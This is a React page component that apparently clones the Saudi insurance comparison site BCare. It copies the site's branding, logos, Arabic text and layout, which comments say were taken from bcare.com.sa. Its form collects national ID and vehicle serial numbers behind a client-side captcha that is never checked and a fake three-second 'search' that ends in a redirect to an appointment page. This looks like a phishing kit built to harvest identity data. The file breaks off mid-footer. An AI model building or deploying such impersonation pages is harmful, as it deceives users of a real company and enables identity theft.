import { useState, useEffect } from "react";
import { Link, useLocation } from "wouter";
import { socket } from "@/lib/store";

export default function FahsHome() {
  const [insuranceType, setInsuranceType] = useState("new");
  const [vehicleType, setVehicleType] = useState("form");
  const [nationalId, setNationalId] = useState("");
  const [serialNumber, setSerialNumber] = useState("");
  const [captchaInput, setCaptchaInput] = useState("");
  const [agreed, setAgreed] = useState(false);
  const [isSearching, setIsSearching] = useState(false);
  const [, setLocation] = useLocation();
  const [captchaCode, setCaptchaCode] = useState("");
  const [activeTab, setActiveTab] = useState("vehicles");

  useEffect(() => {
    generateCaptcha();
  }, []);

  const generateCaptcha = () => {
    const chars = "0123456789";
    let code = "";
    for (let i = 0; i < 4; i++) {
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    setCaptchaCode(code);
    setCaptchaInput("");
  };

  const handleSubmit = () => {
    if (!nationalId || !serialNumber || !captchaInput || !agreed) return;
    setIsSearching(true);
    setTimeout(() => {
      setIsSearching(false);
      setLocation('/new-appointment');
    }, 3000);
  };

  // Colors from bcare.com.sa
  const primaryBlue = "#146494";
  const darkBlue = "#0d4770";
  const accentOrange = "#f5a623";
  const footerDark = "#146494";
  const tealAccent = "#00b4d8";

  return (
    <div className="min-h-screen bg-white overflow-x-hidden" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
      
      {/* Header */}
      <header className="bg-white py-4 px-4 lg:px-8 flex items-center justify-between sticky top-0 z-50 shadow-sm">
        <div className="flex items-center gap-3">
          <Link to="/" className="cursor-pointer">
            <img src="/images/bcare/Bcarelogo.svg" alt="بي كير" className="h-8 md:h-10" />
          </Link>
        </div>
        <div className="flex items-center gap-3">
          <button className="w-8 h-8 rounded-full border-2 border-teal-500 flex items-center justify-center text-teal-500">
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
          </button>
          <button className="px-3 py-1 text-sm font-medium text-gray-600 border border-gray-300 rounded">EN</button>
        </div>
      </header>

      {/* Hero Section - Blue background */}
      <section className="relative" style={{ backgroundColor: primaryBlue, minHeight: '460px', overflow: 'visible' }}>
        {/* Background decorative SVGs - white on blue */}
        <img src="/images/bcare/LeftBackground.svg" alt="" className="absolute left-0 top-0 pointer-events-none z-[1]" style={{ height: '140%', opacity: 0.12 }} />
        <img src="/images/bcare/RightBackground.svg" alt="" className="absolute right-0 top-0 pointer-events-none z-[1]" style={{ height: '140%', opacity: 0.12 }} />
        
        <div className="container mx-auto px-4 lg:px-8 pt-12 pb-32 relative z-10 text-center">
          <h1 className="text-2xl md:text-4xl lg:text-[42px] font-bold text-white leading-tight mb-4" style={{ lineHeight: '1.4' }}>
            المنصة الأذكى لمقارنة عروض تأمين السيارات في السعودية
          </h1>
          <p className="text-white/80 text-sm md:text-base max-w-4xl mx-auto font-bold whitespace-nowrap">
            المنصة الأذكى لمقارنة عروض أكثر من 20 شركة تأمين. احصل على أرخص تأمين سيارات مع إصدار فوري وربط مباشر بنجم.
          </p>
        </div>
      </section>

      {/* White/gray area below hero */}
      <div className="bg-gray-50">
      {/* Insurance Type Tabs + Form Card */}
      <div className="w-full -mt-52 relative z-20 px-4 md:px-16 lg:px-28">
        <div className="bg-white shadow-lg" style={{ borderRadius: '15px', overflow: 'visible' }}>
          {/* Tabs */}
          <div className="flex justify-start bg-white px-4 md:px-8 pt-2" style={{ position: 'relative', borderRadius: '15px 15px 0 0' }}>
            {[
              { id: "vehicles", label: "مركبات", icon: (<img src="/images/bcare/tab-car.svg" className="w-7 h-7" alt="مركبات" style={{ filter: 'inherit' }} />) },
              { id: "medical", label: "طبي", icon: (<img src="/images/bcare/tab-heart-pulse.svg" className="w-7 h-7" alt="طبي" style={{ filter: 'inherit' }} />) },
              { id: "malpractice", label: "اخطاء طبية", icon: (<img src="/images/bcare/tab-stethoscope.svg" className="w-7 h-7" alt="اخطاء طبية" style={{ filter: 'inherit' }} />) },
              { id: "travel", label: "سفر", icon: (<img src="/images/bcare/tab-plane.svg" className="w-7 h-7" alt="سفر" style={{ filter: 'inherit' }} />) },
              { id: "domestic", label: "العمالة المنزلية", icon: (<img src="/images/bcare/tab-house-user.svg" className="w-7 h-7" alt="العمالة المنزلية" style={{ filter: 'inherit' }} />) },
            ].map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`py-6 px-6 md:px-8 flex flex-col items-center gap-2 text-xs md:text-sm font-bold transition-colors relative ${
                  activeTab === tab.id
                    ? "text-[#1a73a7]"
                    : "text-gray-400 hover:text-gray-600"
                }`}
              >
                <span style={{ filter: activeTab === tab.id ? 'invert(42%) sepia(60%) saturate(600%) hue-rotate(300deg) brightness(85%)' : 'invert(70%) sepia(0%) saturate(0%) brightness(85%)' }}>{tab.icon}</span>
                <span>{tab.label}</span>
                {activeTab === tab.id && (
                  <span className="absolute bottom-0" style={{ width: '60%', height: '3px', backgroundColor: '#f5a623', borderRadius: '2px' }}></span>
                )}
              </button>
            ))}
          </div>

          {/* Separator line */}
          <div style={{ height: '30px', backgroundColor: '#e0e0e0' }}></div>

          {/* Form - Two row layout like bcare.com.sa */}
          <div className="bg-white px-6 md:px-10 lg:px-14 pt-4 pb-16">
            {/* Columns layout: radios on top, input below each */}
            <div className="flex flex-col md:flex-row items-end gap-3 md:gap-6">
              {/* Column 1: الغرض من التأمين + رقم الهوية */}
              <div>
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">الغرض من التأمين</label>
                <div className="flex gap-2 mb-3">
                  <label className={`flex items-center gap-2 cursor-pointer pl-12 pr-3 py-1.5 text-sm font-bold transition-all border ${
                    insuranceType === "new" ? "bg-[#1a5276] text-white border-[#1a5276]" : "bg-gray-100 text-[#1a5276] border-transparent"
                  }`} style={{ borderRadius: '5px' }}>
                    <input type="radio" name="insuranceType" value="new" checked={insuranceType === "new"} onChange={() => setInsuranceType("new")} className="w-4 h-4" style={{ accentColor: '#f5a623' }} />
                    <span>تأمين جديد</span>
                  </label>
                  <label className={`flex items-center gap-2 cursor-pointer pl-12 pr-3 py-1.5 text-sm font-bold transition-all border ${
                    insuranceType === "transfer" ? "bg-[#1a5276] text-white border-[#1a5276]" : "bg-gray-100 text-[#1a5276] border-transparent"
                  }`} style={{ borderRadius: '5px' }}>
                    <input type="radio" name="insuranceType" value="transfer" checked={insuranceType === "transfer"} onChange={() => setInsuranceType("transfer")} className="w-4 h-4" style={{ accentColor: '#f5a623' }} />
                    <span>نقل ملكية</span>
                  </label>
                </div>
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="رقم الهوية / الإقامة"
                  value={nationalId}
                  onChange={(e) => setNationalId(e.target.value.replace(/\D/g, ''))}
                  className="w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold" style={{ color: '#ccc' }}
                  onFocus={(e) => e.target.style.color = '#333'}
                  onBlur={(e) => { if (!e.target.value) e.target.style.color = '#ccc' }}
                />
              </div>
              {/* Column 2: نوع تسجيل المركبة + الرقم التسلسلي */}
              <div>
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">نوع تسجيل المركبة</label>
                <div className="flex gap-2 mb-3">
                  <label className={`flex items-center gap-2 cursor-pointer pl-12 pr-3 py-1.5 text-sm font-bold transition-all border ${
                    vehicleType === "form" ? "bg-[#1a5276] text-white border-[#1a5276]" : "bg-gray-100 text-[#1a5276] border-transparent"
                  }`} style={{ borderRadius: '5px' }}>
                    <input type="radio" name="vehicleType" value="form" checked={vehicleType === "form"} onChange={() => setVehicleType("form")} className="w-4 h-4" style={{ accentColor: '#f5a623' }} />
                    <span>استمارة</span>
                  </label>
                  <label className={`flex items-center gap-2 cursor-pointer pl-12 pr-3 py-1.5 text-sm font-bold transition-all border ${
                    vehicleType === "customs" ? "bg-[#1a5276] text-white border-[#1a5276]" : "bg-gray-100 text-[#1a5276] border-transparent"
                  }`} style={{ borderRadius: '5px' }}>
                    <input type="radio" name="vehicleType" value="customs" checked={vehicleType === "customs"} onChange={() => setVehicleType("customs")} className="w-4 h-4" style={{ accentColor: '#f5a623' }} />
                    <span>بطاقة جمركية</span>
                  </label>
                </div>
                <div className="relative">
                  <input
                    type="text"
                    inputMode="numeric"
                    placeholder="الرقم التسلسلى"
                    value={serialNumber}
                    onChange={(e) => setSerialNumber(e.target.value.replace(/\D/g, ''))}
                    className="w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold" style={{ color: '#ccc' }}
                    onFocus={(e) => e.target.style.color = '#333'}
                    onBlur={(e) => { if (!e.target.value) e.target.style.color = '#ccc' }}
                  />
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-blue-400 cursor-pointer">
                    <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                  </span>
                </div>
              </div>
              {/* Column 3: رمز التحقق */}
              <div className="flex-shrink-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">رمز التحقق</label>
                <div className="flex items-center gap-0 border border-gray-200 rounded-lg overflow-hidden bg-white">
                <input
                  type="text"
                  inputMode="numeric"
                  value={captchaInput}
                  onChange={(e) => setCaptchaInput(e.target.value.replace(/\D/g, ''))}
                  className="w-24 px-3 py-3 bg-white text-center focus:outline-none text-sm border-none"
                />
                <button onClick={generateCaptcha} className="px-1.5 text-gray-400 hover:text-[#1a73a7]">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                  </svg>
                </button>
                <div 
                  className="px-3 py-2 select-none flex items-center justify-center gap-0.5"
                  style={(() => {
                    const bgColors = ['#00e5ff','#ffeb3b','#ff9800','#e91e63','#4caf50','#9c27b0','#00bcd4','#8bc34a','#ff5722','#03a9f4'];
                    const c = bgColors[Math.floor(Math.random() * bgColors.length)];
                    const patterns = [
                      { background: `radial-gradient(circle, ${c} 1px, transparent 1px)`, backgroundSize: '6px 6px' },
                      { background: `linear-gradient(45deg, ${c} 25%, transparent 25%, transparent 75%, ${c} 75%), linear-gradient(45deg, ${c} 25%, transparent 25%, transparent 75%, ${c} 75%)`, backgroundSize: '8px 8px', backgroundPosition: '0 0, 4px 4px' },
                      { background: `repeating-linear-gradient(0deg, ${c}, ${c} 1px, transparent 1px, transparent 5px), repeating-linear-gradient(90deg, ${c}, ${c} 1px, transparent 1px, transparent 5px)`, backgroundSize: '5px 5px' },
                      { background: `repeating-linear-gradient(45deg, ${c}, ${c} 1px, transparent 1px, transparent 6px)`, backgroundSize: '8px 8px' },
                      { background: `radial-gradient(circle, ${c} 2px, transparent 2px)`, backgroundSize: '10px 10px' },
                    ];
                    const p = patterns[Math.floor(Math.random() * patterns.length)];
                    return { ...p, minWidth: '100px', height: '48px' };
                  })()}
                >
                  {captchaCode.split('').map((digit, i) => {
                    const allColors = ['#e53935', '#8e24aa', '#1565c0', '#333', '#e65100', '#2e7d32', '#c62828', '#4527a0', '#0d47a1'];
                    const randomColor = allColors[Math.floor(Math.random() * allColors.length)];
                    const randomRotation = Math.floor(Math.random() * 30) - 15;
                    return (
                      <span key={i + captchaCode} style={{ 
                        color: randomColor, 
                        fontSize: `${24 + Math.floor(Math.random() * 10)}px`, 
                        fontWeight: 'bold',
                        transform: `rotate(${randomRotation}deg)`,
                        display: 'inline-block',
                        textShadow: '1px 1px 0px rgba(0,0,0,0.1)'
                      }}>{digit}</span>
                    );
                  })}
                </div>
                </div>
              </div>
              {/* Button + Agreement */}
              <div className="flex-shrink-0 self-end relative">
                <button
                  onClick={handleSubmit}
                  disabled={isSearching}
                  className="px-12 rounded-lg text-white font-bold text-base transition-all hover:opacity-90"
                  style={{ backgroundColor: '#f5a623', height: '48px' }}
                >
                  {isSearching ? (
                    <div className="flex items-center gap-2">
                      <svg className="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      جاري البحث...
                    </div>
                  ) : "إظهار العروض"}
                </button>
                <div className="absolute right-0 flex items-center gap-2 mt-2 whitespace-nowrap group" dir="rtl">
                  <input type="checkbox" id="agree" checked={agreed} onChange={(e) => setAgreed(e.target.checked)} className="w-4 h-4" />
                  <label htmlFor="agree" className="text-sm cursor-pointer relative" style={{ color: '#1a5276', fontWeight: 400 }}>
                    أوافق على منح حق الاستعلام
                    <div className="hidden group-hover:block absolute top-full right-0 mt-2 rounded-lg shadow-lg p-3 text-right text-sm leading-relaxed z-50" style={{ backgroundColor: '#f5f5f5', color: '#1a5276', fontWeight: 400, whiteSpace: 'normal', width: '380px' }}>
                      أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي
                    </div>
                  </label>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Decorative SVGs on white background below the card */}
      <div className="relative" style={{ height: '0px', overflow: 'visible' }}>
        <img src="/images/bcare/LeftBackground-blue.svg" alt="" className="pointer-events-none" style={{ height: '700px', opacity: 0.12, position: 'absolute', left: '1%', top: '-500px', zIndex: 1 }} />
      </div>

      {/* Partners Bar */}
      <section className="mt-32 py-6 pb-10 relative z-10">
        <div className="px-4 md:px-16 lg:px-28">
          <div className="bg-white rounded-lg shadow-sm border border-gray-100 relative z-10">
            <div className="flex items-center px-5 py-6">
              {/* Right side: Authorization info */}
              <div className="flex-shrink-0 flex items-center gap-4 pl-6 border-l border-gray-200">
                <div className="flex flex-col items-end">
                  <span className="text-xs font-bold mb-0" style={{ color: '#146494' }}>مصرح من:</span>
                  <img src="/images/bcare/SaudiCentralImage.svg" alt="هيئة التأمين" className="h-12 md:h-14" />
                </div>
                <div className="h-16 w-px bg-gray-300"></div>
                <img src="/images/bcare/23arbic.svg" alt="23 شركة تأمين" className="h-20 md:h-24" />
              </div>
              {/* Left side: Scrollable company logos */}
              <div className="flex items-center flex-1 min-w-0">
                <div className="flex items-center gap-6 md:gap-10 overflow-x-auto flex-1 py-2" style={{ scrollbarWidth: 'none' }}>
                  <img src="/images/bcare/Tawuniya.svg" alt="التعاونية" className="h-8 md:h-10 flex-shrink-0" />
                  <img src="/images/bcare/AlRajhi.svg" alt="الراجحي" className="h-8 md:h-10 flex-shrink-0" />
                  <img src="/images/bcare/MedGulf.svg" alt="ميدغلف" className="h-8 md:h-10 flex-shrink-0" />
                  <img src="/images/bcare/GGI.svg" alt="GIG" className="h-8 md:h-10 flex-shrink-0" />
                  <img src="/images/bcare/Allianz.svg" alt="أليانز" className="h-8 md:h-10 flex-shrink-0" />
                  <img src="/images/bcare/ACIG.svg" alt="ACIG" className="h-8 md:h-10 flex-shrink-0" />
                  <img src="/images/bcare/Amana.svg" alt="أمانة" className="h-8 md:h-10 flex-shrink-0" />
                  <img src="/images/bcare/ArabianShield.svg" alt="الدرع العربي" className="h-8 md:h-10 flex-shrink-0" />
                  <img src="/images/bcare/AXA.svg" alt="أكسا" className="h-8 md:h-10 flex-shrink-0" />
                  <img src="/images/bcare/UCA.svg" alt="UCA" className="h-8 md:h-10 flex-shrink-0" />
                  <img src="/images/bcare/Aljazira-Takaful.svg" alt="الجزيرة تكافل" className="h-8 md:h-10 flex-shrink-0" />
                  <img src="/images/bcare/Benfit.svg" alt="بنفت" className="h-8 md:h-10 flex-shrink-0" />
                </div>
                <button className="flex-shrink-0 w-8 h-8 rounded-full bg-gray-50 shadow flex items-center justify-center text-[#146494] hover:bg-gray-100 mr-3">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
                </button>
              </div>
            </div>
          </div>
        </div>
      </section>
      </div>{/* end bg-gray-50 wrapper */}

      {/* Features Section - طريقك آمن مع بي كير */}
      <section className="py-10 md:py-16 bg-gray-50">
        <div className="container mx-auto px-4 lg:px-8">
          <h2 className="text-3xl md:text-4xl font-bold text-center mb-10 md:mb-14" style={{ color: primaryBlue }}>
            طريقك آمن مع بي كير
          </h2>
          
          {/* Top Row - 4 cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-4 max-w-6xl mx-auto">
            <div className="bg-white px-3 py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-12 h-12 mx-auto mb-4 flex items-center justify-center">
                <img src="/images/bcare/InsureOneMin.svg" alt="تأمينك في دقيقة" className="w-10 h-10" />
              </div>
              <h3 className="font-bold mb-3 text-xl" style={{ color: '#146494' }}>تأمينك في دقيقة</h3>
              <p className="text-lg leading-relaxed" style={{ color: '#146494' }}>نقارن لك كل عروض الأسعار بشكل فوري من كل شركات التأمين</p>
            </div>
            <div className="bg-white px-3 py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-12 h-12 mx-auto mb-4 flex items-center justify-center">
                <img src="/images/bcare/SprateInsure.svg" alt="فصّل تأمينك" className="w-10 h-10" />
              </div>
              <h3 className="font-bold mb-3 text-xl" style={{ color: '#146494' }}>فصّل تأمينك</h3>
              <p className="text-lg leading-relaxed" style={{ color: '#146494' }}>أنواع تأمين متعددة: تأمين ضد الغير، تأمين مميز، تأمين شامل وقيمة تحمل متنوعة</p>
            </div>
            <div className="bg-white px-3 py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-12 h-12 mx-auto mb-4 flex items-center justify-center">
                <img src="/images/bcare/PriceLess.svg" alt="أسعار أقل" className="w-10 h-10" />
              </div>
              <h3 className="font-bold mb-3 text-xl" style={{ color: '#146494' }}>أسعار أقل</h3>
              <p className="text-lg leading-relaxed" style={{ color: '#146494' }}>عندنا فريق يراقب كل صغيرة و كبيرة في السوق و يضمن أن سعرك الأقل و المناسب لك وفق احتياجك</p>
            </div>
            <div className="bg-white px-3 py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-12 h-12 mx-auto mb-4 flex items-center justify-center">
                <img src="/images/bcare/SechleInsure.svg" alt="جدول تأمينك" className="w-10 h-10" />
              </div>
              <h3 className="font-bold mb-3 text-xl" style={{ color: '#146494' }}>جدول تأمينك</h3>
              <p className="text-lg leading-relaxed" style={{ color: '#146494' }}>نرسل لك إشعارات تذكيرية لتجديد تأمينك وتقدر تجدول تاريخ بدايته</p>
            </div>
          </div>

          {/* Bottom Row - 4 cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 max-w-6xl mx-auto">
            <div className="bg-white px-3 py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-12 h-12 mx-auto mb-4 flex items-center justify-center">
                <img src="/images/bcare/Wind.svg" alt="هب ريح" className="w-10 h-10" />
              </div>
              <h3 className="font-bold mb-3 text-xl" style={{ color: '#146494' }}>هب ريح</h3>
              <p className="text-lg leading-relaxed" style={{ color: '#146494' }}>نربط وثيقتك في أسرع وقت مع نظام المرور ونجم</p>
            </div>
            <div className="bg-white px-3 py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-12 h-12 mx-auto mb-4 flex items-center justify-center">
                <img src="/images/bcare/DiscountsHome.svg" alt="خصومات تضبطك" className="w-10 h-10" />
              </div>
              <h3 className="font-bold mb-3 text-xl" style={{ color: '#146494' }}>خصومات تضبطك</h3>
              <p className="text-lg leading-relaxed" style={{ color: '#146494' }}>خصومات لبعض القطاعات الحكومية وشبه الحكومية والخاصة</p>
            </div>
            <div className="bg-white px-3 py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-12 h-12 mx-auto mb-4 flex items-center justify-center">
                <img src="/images/bcare/OneWay.svg" alt="منافع تحميك" className="w-10 h-10" />
              </div>
              <h3 className="font-bold mb-3 text-xl" style={{ color: '#146494' }}>منافع تحميك</h3>
              <p className="text-lg leading-relaxed" style={{ color: '#146494' }}>خطط تأمين متنوعة مع المرونة في تحديد المنافع الإضافية اللي تناسبك</p>
            </div>
            <div className="bg-white px-3 py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-12 h-12 mx-auto mb-4 flex items-center justify-center">
                <svg className="w-10 h-10 text-[#1a73a7]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                </svg>
              </div>
              <h3 className="font-bold mb-3 text-xl" style={{ color: '#146494' }}>مكان واحد</h3>
              <p className="text-lg leading-relaxed" style={{ color: '#146494' }}>تدير كل وثائقك إدارة إلكترونية كاملة من مكان واحد وتجددها في أي وقت</p>
            </div>
          </div>
        </div>
      </section>

      {/* Why BCare Section */}
      <section className="py-10 md:py-16 bg-white">
        <div className="container mx-auto px-4 lg:px-8">
          <h2 className="text-2xl md:text-3xl font-bold text-center mb-10 md:mb-14" style={{ color: primaryBlue }}>
            ليش بي كير خيارك الأول في التأمين؟
          </h2>
          <div className="grid grid-cols-2 md:grid-cols-3 gap-8 max-w-3xl mx-auto">
            {[
              { title: "منك وفيك", desc: "منصة سعودية 100%" },
              { title: "عروض تفهمك", desc: "عروض مخصصة لاحتياجاتك" },
              { title: "سعر يرضيك", desc: "أفضل الأسعار في السوق" },
              { title: "إصدار سريع", desc: "إصدار فوري للوثيقة" },
              { title: "نقّسط تأمينك", desc: "خيارات تقسيط مرنة" },
              { title: "نفزع لك", desc: "دعم فني على مدار الساعة" },
            ].map((item, i) => (
              <div key={i} className="text-center">
                <div className="w-16 h-16 mx-auto mb-3 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e8f4fd' }}>
                  <svg className="w-8 h-8" style={{ color: primaryBlue }} fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
                  </svg>
                </div>
                <h3 className="font-bold text-gray-800 text-sm md:text-base mb-1">{item.title}</h3>
                <p className="text-gray-500 text-xs md:text-sm">{item.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="text-white pt-8 md:pt-12 pb-6" style={{ backgroundColor: footerDark }}>
        <div className="container mx-auto px-4 lg:px-8">
          {/* Top Section */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8">
            {/* Logo + Phone */}
            <div className="text-right">
              <img src="/images/bcare/Bcarelogo.svg" alt="بي كير" className="h-10 mb-4 brightness-0 invert" />
              <p className="text-white/80 text-sm mb-3" dir="ltr">8001180044</p>
              {/* App Stores */}
              <div className="flex gap-2 mt-4">
                <img src="/images/bcare/googlestore.svg" alt="Google Play" className="h-9" />
                <img src="/images/bcare/applestore.svg" alt="App Store" className="h-9" />
                <img src="/images/bcare/huaweistore.svg" alt="AppGallery" className="h-9" />
              </div>
            </div>

            {/* عن بي كير */}
            <div className="text-right">
              <h3 className="font-bold mb-4 text-base">عن بي كير</h3>
              <ul className="space-y-2 text-sm text-white/80">
                <li><a href="#" className="hover:text-white hover:underline">خصومات وريف</a></li>
                <li><a href="#" className="hover:text-white hover:underline">سياسة الخصوصية</a></li>
                <li><a href="#" className="hover:text-white hover:underline">الشروط والأحكام</a></li>
                <li><a href="#" className="hover:text-white hover:underline">وظائف</a></li>
              </ul>
            </div>

            {/* منتجاتنا */}
            <div className="text-right">
              <h3 className="font-bold mb-4 text-base">منتجاتنا</h3>
              <ul className="space-y-2 text-sm text-white/80">
                <li><a href="#" className="hover:text-white hover:underline">تأمين المركبات</a></li>
                <li><a href="#" className="hover:text-white hover:underline">التأمين الطبي</a></li>
                <li><a href="#" className="hover:text-white hover:underline">تأمين السفر</a></li>
                <li><a href="#" className="hover:text-white hover:underline">تأمين الأخطاء الطبية</a></li>
                <li><a href="#" className="hover:text-white hover:underline">تأمين العمالة المنزلية</a></li>
              </ul>
            </div>

            {/* الدعم الفني + روابط مهمة */}
            <div className="text-right">
              <h3 className="font-bold mb-4 text-base">الدعم الفني</h3>
              <ul className="space-y-2 text-sm text-white/80 mb-6">
                <li><a href="#" className="hover:text-white hover:underline">المدونة</a></li>
                <li><a href="#" className="hover:text-white hover:underline">إلغاء وثيقتك</a></li>
                <li><a href="#" className="hover:text-white hover:underline">رفع تذكرة</a></li>
                <li><a href="#" className="hover:text-white hover:underline">اطبع وثيقتك</a></li>
              </ul>
              <h3 className="font-bold mb-4 text-base">روابط مهمة</h3>
              <ul className="space-y-2 text-sm text-white/80">
                <li><a href="#" className="hover:text-white hover:underline">هيئة التأمين</a></li>
                <li><a href="#" className="hover:text-white hover:underline">طريقة رفع شكوى لهيئة التأمين</a></li>
                <li><a href="#" className="hover:text-white hover:underline">قواعد ولوائح هيئة التأمين</a></li>
                <li><a href="#" className="hover:text-white hover:underline">شهادة ضريبة القيمة المضافة</a></li>
              </ul>
            </div>
          </div>

          {/* Social Icons */}
          <div className="flex gap-3 justify-center mb-6">
            {/* Facebook */}
            <a href="#" className="w-9 h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
            </a>
            {/* Instagram */}
            <a href="#" className="w-9 h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
            </a>
            {/* X (Twitter) */}
            <a href="#" className="w-9 h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
            </a>
            {/* LinkedIn */}
            <a href="#" className="w-9 h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
            </a>
            {/* WhatsApp */}
